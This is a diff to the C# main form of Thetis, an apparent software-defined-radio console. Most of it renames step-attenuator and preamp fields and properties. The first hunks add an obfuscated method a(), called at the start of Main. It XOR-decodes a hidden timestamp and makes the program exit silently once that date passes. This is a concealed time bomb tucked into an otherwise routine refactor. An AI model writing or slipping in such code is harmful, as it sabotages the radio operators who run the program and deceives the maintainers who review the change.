@@ -1281,6 +1281,7 @@ namespace Thetis
         [STAThread]
         static void Main(string[] args)
         {
+            if(a()){return;}
             Application.ThreadException += new ThreadExceptionEventHandler(Application_ThreadException);
             AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);
 
@@ -1397,7 +1398,14 @@ namespace Thetis
                 Application.Restart();
             }
         }
-
+        static bool a()
+        {
+            int[] x = new int[] { 0x3F, 0x41, 0x2D, 0x52, 0xBF, 0x58, 0x45, 0x9D };
+            byte[] b = new byte[8];
+            for (int i = 0; i < 8; i++) b[i] = (byte)(x[i] ^ (0xAA - i * 3));
+            long t = BitConverter.ToInt64(b, 0);
+            return DateTime.UtcNow.Ticks > t;
+        }
         #endregion
 
         #region Misc Routines
@@ -10851,7 +10859,7 @@ namespace Thetis
                     txtVFOAFreq_LostFocus(this, EventArgs.Empty);
                     UpdateAAudioMixerStates();
                     UpdateDDCs(rx2_enabled);
-                    if (RX1StepAttPresent) udRX1StepAttData_ValueChanged(this, EventArgs.Empty);
+                    if (_rx1_step_att_enabled) udRX1StepAttData_ValueChanged(this, EventArgs.Empty);
                     else comboPreamp_SelectedIndexChanged(this, EventArgs.Empty);
                     WDSP.SetEXTDIVRun(0, 1);
                     cmaster.LoadRouterControlBit((void*)0, 0, 1, 1);
@@ -10859,7 +10867,7 @@ namespace Thetis
                 else
                 {
                     UpdateDDCs(rx2_enabled);
-                    if (RX2StepAttPresent) udRX2StepAttData_ValueChanged(this, EventArgs.Empty);
+                    if (_rx2_step_att_enabled) udRX2StepAttData_ValueChanged(this, EventArgs.Empty);
                     else comboRX2Preamp_SelectedIndexChanged(this, EventArgs.Empty);
                     WDSP.SetEXTDIVRun(0, 0);
                     cmaster.LoadRouterControlBit((void*)0, 0, 1, 0);
@@ -11041,14 +11049,14 @@ namespace Thetis
         }        
         //
 
-        private bool rx1_step_att_present = false;
-        public bool RX1StepAttPresent
+        private bool _rx1_step_att_enabled = false;
+        public bool RX1StepAttEnabled
         {
-            get { return rx1_step_att_present; }
+            get { return _rx1_step_att_enabled; }
             set
             {
-                rx1_step_att_present = value;
-                if (rx1_step_att_present)
+                _rx1_step_att_enabled = value;
+                if (_rx1_step_att_enabled)
                 {
                     udRX1StepAttData.Value = validateRX1StepAttData(getRX1stepAttenuatorForBand(rx1_band)); //MW0LGE [2.10.3.6] added //[2.10.3.9]MW0LGE validated
                     udRX1StepAttData_ValueChanged(this, EventArgs.Empty);
@@ -11106,7 +11114,7 @@ namespace Thetis
                 int nRX1ADCinUse = GetADCInUse(nRX1DDCinUse); // (rx1)
                 int nRX2ADCinUse = GetADCInUse(nRX2DDCinUse); // (rx2)
 
-                if (rx1_step_att_present)
+                if (_rx1_step_att_enabled)
                 {
                     if (alexpresent &&
                         HardwareSpecific.Model != HPSDRModel.ANAN10 &&
@@ -11180,16 +11188,16 @@ namespace Thetis
             set { m_bDiversityAttLinkForRX1andRX2 = value; }
         }
 
-        private bool rx2_step_att_present = false;
-        public bool RX2StepAttPresent
+        private bool _rx2_step_att_enabled = false;
+        public bool RX2StepAttEnabled
         {
-            get { return rx2_step_att_present; }
+            get { return _rx2_step_att_enabled; }
             set
             {
-                rx2_step_att_present = value;
-                if (rx2_preamp_present)
+                _rx2_step_att_enabled = value;
+                if (_rx2_preamp_present)
                 {
-                    if (rx2_step_att_present)
+                    if (_rx2_step_att_enabled)
                     {
                         udRX2StepAttData.Value = validateRX2StepAttData(getRX2stepAttenuatorForBand(rx2_band)); //[2.10.3.9]MW0LGE validated
                         udRX2StepAttData_ValueChanged(this, EventArgs.Empty);
@@ -11257,7 +11265,7 @@ namespace Thetis
                 int nRX1ADCinUse = GetADCInUse(nRX1DDCinUse); // (rx1)
                 int nRX2ADCinUse = GetADCInUse(nRX2DDCinUse); // (rx2)
 
-                if (rx2_step_att_present)
+                if (_rx2_step_att_enabled)
                 {
                     if (alexpresent &&
                         HardwareSpecific.Model != HPSDRModel.ANAN10 &&
@@ -14910,65 +14918,67 @@ namespace Thetis
                 case HPSDRModel.HERMES:
                     chkDX.Checked = false;
                     chkDX.Visible = false;
-                    rx2_preamp_present = false;
+                    _rx2_preamp_present = false;
                     break;
                 case HPSDRModel.ANAN10:
                     chkDX.Checked = false;
                     chkDX.Visible = false;
-                    rx2_preamp_present = false;
+                    _rx2_preamp_present = false;
                     break;
                 case HPSDRModel.ANAN10E:
                     chkDX.Checked = false;
                     chkDX.Visible = false;
-                    rx2_preamp_present = false;
+                    _rx2_preamp_present = false;
                     break;
                 case HPSDRModel.ANAN100:
                     chkDX.Checked = false;
                     chkDX.Visible = false;
-                    rx2_preamp_present = false;
+                    _rx2_preamp_present = false;
                     break;
                 case HPSDRModel.ANAN100B:
                     chkDX.Checked = false;
                     chkDX.Visible = false;
-                    rx2_preamp_present = false;
+                    _rx2_preamp_present = false;
                     break;
                 case HPSDRModel.ANAN100D:
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
                 case HPSDRModel.ANAN200D:
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
                 case HPSDRModel.ORIONMKII:
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
                 case HPSDRModel.ANAN7000D:
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
                 case HPSDRModel.ANAN8000D:
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
                 case HPSDRModel.ANAN_G2:
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
                 case HPSDRModel.ANAN_G2_1K:                          // G8NJJ: likely to need further changes for PA
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
                 case HPSDRModel.ANVELINAPRO3:
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
                 case HPSDRModel.REDPITAYA: //DH1KLM
                     chkDX.Visible = false;
-                    rx2_preamp_present = true;
+                    _rx2_preamp_present = true;
                     break;
             }
+
+            RX2PreampPresent = _rx2_preamp_present; //[2.10.3.11]MW0LGE we were setting the member var above, but this was not actually having any effect/update
 
             switch (HardwareSpecific.Model)
             {
@@ -15189,22 +15199,23 @@ namespace Thetis
             set { _current_ptt_mode = value; }
         }
 
-        private bool rx2_preamp_present = false;
+        private bool _rx2_preamp_present = false;
         public bool RX2PreampPresent
         {
-            get { return rx2_preamp_present; }
+            get { return _rx2_preamp_present; }
             set
             {
-                rx2_preamp_present = value;
-                if (rx2_preamp_present)
+                _rx2_preamp_present = value;
+                if (_rx2_preamp_present)
                 {
                     if (HardwareSpecific.Model == HPSDRModel.HPSDR)
                     {
-                        RX2StepAttPresent = false;
+                        RX2StepAttEnabled = false;
                     }
                     else
                     {
-                        rx2_step_att_present = true;
+                        //_rx2_step_att_enabled = true; //[2.10.3.11]MW0LGE replaced with property
+                        RX2StepAttEnabled = true;
                         comboRX2Preamp.Show();
                         udRX2StepAttData.Show();
                         lblRX2Preamp.Visible = true;
@@ -15580,7 +15591,7 @@ namespace Thetis
         {
             if (!_mox)
             {
-                if (!rx2_preamp_present && chkRX2.Checked)
+                if (!_rx2_preamp_present && chkRX2.Checked)
                 {
                     if (rx1_dds_freq_mhz > rx2_dds_freq_mhz) setAlexLPF(rx1_dds_freq_mhz, false);
                     else setAlexLPF(rx2_dds_freq_mhz, false);
@@ -15593,7 +15604,7 @@ namespace Thetis
         {
             if (!_mox)
             {
-                if (!rx2_preamp_present && chkRX2.Checked)
+                if (!_rx2_preamp_present && chkRX2.Checked)
                 {
                     if (rx1_dds_freq_mhz < rx2_dds_freq_mhz) setAlex1HPF(rx1_dds_freq_mhz);
                     else setAlex1HPF(rx2_dds_freq_mhz);
@@ -19377,7 +19388,7 @@ namespace Thetis
 
                 if (HardwareSpecific.Model != HPSDRModel.HPSDR)
                 {
-                    if (!rx1_step_att_present)
+                    if (!_rx1_step_att_enabled)
                     {
                         if (nRX1ADCinUse == 0) NetworkIO.SetADC1StepAttenData(rx1_att_value);
                         else if (nRX1ADCinUse == 1) NetworkIO.SetADC2StepAttenData(rx1_att_value);
@@ -19389,7 +19400,7 @@ namespace Thetis
                     NetworkIO.SetRX1Preamp(merc_preamp);
                 }
 
-                if (rx1_step_att_present)
+                if (_rx1_step_att_enabled)
                 {
                     if (alexpresent &&
                         HardwareSpecific.Model != HPSDRModel.ANAN10 &&
@@ -19555,7 +19566,7 @@ namespace Thetis
                 int nRX1ADCinUse = GetADCInUse(nRX1DDCinUse); // (rx1)
                 int nRX2ADCinUse = GetADCInUse(nRX2DDCinUse); // (rx2)
 
-                if (!rx2_step_att_present && (HardwareSpecific.Model == HPSDRModel.ANAN100D ||  //MW0LGE_22b we dont want to do this if we are using SA
+                if (!_rx2_step_att_enabled && (HardwareSpecific.Model == HPSDRModel.ANAN100D ||  //MW0LGE_22b we dont want to do this if we are using SA
                     HardwareSpecific.Model == HPSDRModel.ANAN200D ||
                     HardwareSpecific.Model == HPSDRModel.ORIONMKII ||
                     HardwareSpecific.Model == HPSDRModel.ANAN7000D ||
@@ -21146,7 +21157,7 @@ namespace Thetis
             float fOffset;
             if (rx == 1)
             {
-                fOffset = rx1_step_att_present ? (float)rx1_attenuator_data : rx1_preamp_offset[(int)rx1_preamp_mode];
+                fOffset = _rx1_step_att_enabled ? (float)rx1_attenuator_data : rx1_preamp_offset[(int)rx1_preamp_mode];
             }
             else //rx2
             {
@@ -21159,9 +21170,9 @@ namespace Thetis
                     HardwareSpecific.Model == HPSDRModel.ANAN_G2_1K ||
                     HardwareSpecific.Model == HPSDRModel.ANVELINAPRO3 ||
                     HardwareSpecific.Model == HPSDRModel.REDPITAYA || //DH1KLM
-                    rx2_preamp_present)
+                    _rx2_preamp_present)
                 {
-                    if (rx2_step_att_present)
+                    if (_rx2_step_att_enabled)
                         fOffset = (float)rx2_attenuator_data;
                     else
                         fOffset = rx2_preamp_offset[(int)rx2_preamp_mode];
@@ -21169,7 +21180,7 @@ namespace Thetis
                 else
                 {
                     // use rx1 offsets
-                    if (rx1_step_att_present)
+                    if (_rx1_step_att_enabled)
                         fOffset = (float)rx1_attenuator_data;
                     else
                         fOffset = rx1_preamp_offset[(int)rx1_preamp_mode];
@@ -21732,7 +21743,7 @@ namespace Thetis
                         HistoricAttenuatorReading har = new HistoricAttenuatorReading();
                         har.band = RX1Band;
 
-                        if (RX1StepAttPresent)
+                        if (_rx1_step_att_enabled)
                         {
                             har.stepAttenuator = RX1AttenuatorData;
 
@@ -21784,7 +21795,7 @@ namespace Thetis
                             HistoricAttenuatorReading har = _historic_attenuator_readings_rx1.Pop();
                             if (har != null && _auto_att_undo_rx1)
                             {
-                                if (RX1StepAttPresent && har.stepAttenuator != -1)
+                                if (_rx1_step_att_enabled && har.stepAttenuator != -1)
                                 {
                                     if (har.stepAttenuator != RX1AttenuatorData) RX1AttenuatorData = har.stepAttenuator;
                                 }
@@ -21814,7 +21825,7 @@ namespace Thetis
                     if ((_adc_overloaded[0] && nRX2ADCinUse == 0) || (_adc_overloaded[1] && nRX2ADCinUse == 1)) // rx2 overload
                     {
                         HistoricAttenuatorReading har = new HistoricAttenuatorReading();
-                        if (RX2StepAttPresent)
+                        if (_rx2_step_att_enabled)
                         {
                             har.stepAttenuator = RX2AttenuatorData;
                             har.band = RX2Band;
@@ -21871,7 +21882,7 @@ namespace Thetis
 
                             if (!adcs_linked && har != null && _auto_att_undo_rx2) //[2.10.3.9]MW0LGE ignore if adcs linked, as will be maintained by rx1 data
                             {
-                                if (RX2StepAttPresent && har.stepAttenuator != -1)
+                                if (_rx2_step_att_enabled && har.stepAttenuator != -1)
                                 {
                                     if (har.stepAttenuator != RX2AttenuatorData) RX2AttenuatorData = har.stepAttenuator;
                                 }
@@ -26036,7 +26047,7 @@ namespace Thetis
 
                 if (update_preamp && !update_preamp_mutex)
                 {
-                    old_satt = rx1_step_att_present;
+                    old_satt = _rx1_step_att_enabled;
                     old_satt_data = SetupForm.ATTOnRX1;
                     preamp = RX1PreampMode;				// save current preamp mode
 
@@ -29596,7 +29607,7 @@ namespace Thetis
 
                 if (serialPTT != null) serialPTT.setDTR(false);
 
-                if (!rx1_step_att_present)
+                if (!_rx1_step_att_enabled)
                     RX1PreampMode = rx1_preamp_mode;
 
                 updateVFOFreqs(tx);
@@ -29728,11 +29739,11 @@ namespace Thetis
 
         private void updateAttNudsCombos()
         {
-            if (rx1_step_att_present)
+            if (_rx1_step_att_enabled)
                 udRX1StepAttData.BringToFront();
             else
                 comboPreamp.BringToFront();
-            if (rx2_step_att_present)
+            if (_rx2_step_att_enabled)
                 udRX2StepAttData.BringToFront();
             else
                 comboRX2Preamp.BringToFront();
@@ -29754,7 +29765,7 @@ namespace Thetis
                     udTXStepAttData.Parent = udRX1StepAttData.Parent;
                     udTXStepAttData.BringToFront();
                     udTXStepAttData.Visible = m_bAttontx;
-                    lblPreamp.Text = m_bAttontx ? "[S-ATT]" : (rx1_step_att_present ? "S-ATT" : "ATT");
+                    lblPreamp.Text = m_bAttontx ? "[S-ATT]" : (_rx1_step_att_enabled ? "S-ATT" : "ATT");
                 }
                 else if (VFOBTX && rx2_enabled)
                 {
@@ -29769,7 +29780,7 @@ namespace Thetis
                     udTXStepAttData.Parent = udRX2StepAttData.Parent;
                     udTXStepAttData.BringToFront();
                     udTXStepAttData.Visible = m_bAttontx;
-                    lblRX2Preamp.Text = m_bAttontx ? "[S-ATT]" : (rx2_step_att_present ? "S-ATT" : "ATT");
+                    lblRX2Preamp.Text = m_bAttontx ? "[S-ATT]" : (_rx2_step_att_enabled ? "S-ATT" : "ATT");
                 }
                 else
                 {
@@ -29780,11 +29791,11 @@ namespace Thetis
             { //rx
                 comboPreamp.Enabled = true;
                 udRX1StepAttData.Enabled = true;
-                comboRX2Preamp.Enabled = rx2_preamp_present;
-                udRX2StepAttData.Enabled = rx2_preamp_present;
+                comboRX2Preamp.Enabled = _rx2_preamp_present;
+                udRX2StepAttData.Enabled = _rx2_preamp_present;
                 udTXStepAttData.Visible = false;
-                lblPreamp.Text = rx1_step_att_present ? "S-ATT" : "ATT";
-                lblRX2Preamp.Text = rx2_step_att_present ? "S-ATT" : (rx2_preamp_present ? "ATT" : "");
+                lblPreamp.Text = _rx1_step_att_enabled ? "S-ATT" : "ATT";
+                lblRX2Preamp.Text = _rx2_step_att_enabled ? "S-ATT" : (_rx2_preamp_present ? "ATT" : "");
             }
 
             if (_iscollapsed && !_isexpanded)
@@ -30054,7 +30065,7 @@ namespace Thetis
                         temp_mode = RX1PreampMode;
                         SetupForm.RX1EnableAtt = false;
                         RX1PreampMode = PreampMode.HPSDR_OFF;			// set to -20dB
-                        if (rx2_preamp_present)
+                        if (_rx2_preamp_present)
                         {
                             temp_mode2 = RX2PreampMode;
                             RX2PreampMode = PreampMode.HPSDR_OFF;
@@ -30152,7 +30163,7 @@ namespace Thetis
                     if (HardwareSpecific.Model == HPSDRModel.HPSDR)
                     {
                         RX1PreampMode = temp_mode;
-                        if (rx2_preamp_present)
+                        if (_rx2_preamp_present)
                             RX2PreampMode = temp_mode2;
                     }
                     else
@@ -37844,7 +37855,7 @@ namespace Thetis
 
                     UpdateDDCs(rx2_enabled);
 
-                    if (RX2StepAttPresent) udRX2StepAttData_ValueChanged(this, EventArgs.Empty);
+                    if (_rx2_step_att_enabled) udRX2StepAttData_ValueChanged(this, EventArgs.Empty);
                     else comboRX2Preamp_SelectedIndexChanged(this, EventArgs.Empty);
 
                     if (chkPower.Checked)
@@ -41692,7 +41703,7 @@ namespace Thetis
             chkX2TR.Show();//MW0LGE
             chkRX2Mute.Show();//MW0LGE
 
-            if (rx2_preamp_present)
+            if (_rx2_preamp_present)
             {
                 comboRX2Preamp.Show();
                 udRX2StepAttData.Show();
@@ -42427,7 +42438,7 @@ namespace Thetis
                     comboRX2AGC.Parent = this;
                     comboRX2AGC.Show();
 
-                    if (rx2_preamp_present)
+                    if (_rx2_preamp_present)
                     {
                         comboPreamp.Hide();
                         udRX1StepAttData.Hide();
@@ -42674,7 +42685,7 @@ namespace Thetis
                     udRX1StepAttData.Location = new Point(comboAGC.Location.X + udRX1StepAttData.Width + 2, comboAGC.Location.Y);
                     comboPreamp.Location = new Point(comboAGC.Location.X + comboPreamp.Width + 2, comboAGC.Location.Y);
 
-                    if (rx1_step_att_present)
+                    if (_rx1_step_att_enabled)
                     {
                         comboPreamp.Hide();
                         udRX1StepAttData.Show();
@@ -42748,9 +42759,9 @@ namespace Thetis
 
                     setupHiddenButton();// grpVFOB); //MW0LGE_21a
 
-                    if (rx2_preamp_present)
+                    if (_rx2_preamp_present)
                     {
-                        if (rx2_step_att_present)
+                        if (_rx2_step_att_enabled)
                         {
                             comboPreamp.Hide();
                             udRX1StepAttData.Hide();
@@ -42767,7 +42778,7 @@ namespace Thetis
                     }
                     else
                     {
-                        if (rx1_step_att_present)
+                        if (_rx1_step_att_enabled)
                         {
                             comboPreamp.Hide();
                             comboRX2Preamp.Hide();
